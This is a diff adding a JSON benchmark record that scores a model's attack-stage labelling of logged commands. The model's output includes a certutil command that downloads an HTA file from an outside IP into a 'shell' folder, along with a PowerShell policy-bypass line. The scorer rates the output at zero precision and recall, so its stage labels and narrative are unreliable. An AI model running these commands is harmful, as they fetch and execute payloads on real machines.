@@ -1,0 +1,68 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\????",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta C:\\Users\\Administrator\\Desktop\\shell\\Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -decode a.txt b.txt",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "certutil.exe -encode aaa.bbb.ccc ddd.ddd.fff",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "Multiple processes suggest a sophisticated phishing campaign or post-exploitation phase. Web browsers were launching numerous requests to suspicious domains, which may be collecting credentials or other sensitive data. Executable commands involving PowerShell scripts executed with elevated privileges imply scripting activities for persistence, privilege escalation, or lateral movement.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 40753,
+      "completion_tokens": 899,
+      "total_tokens": 41652,
+      "wall_clock_s": 31.586,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 4,
+      "fn": 14
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 4,
+      "fn": 14,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.25,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 40753,
+      "completion_tokens": 899,
+      "total_tokens": 41652,
+      "wall_clock_s": 31.586,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
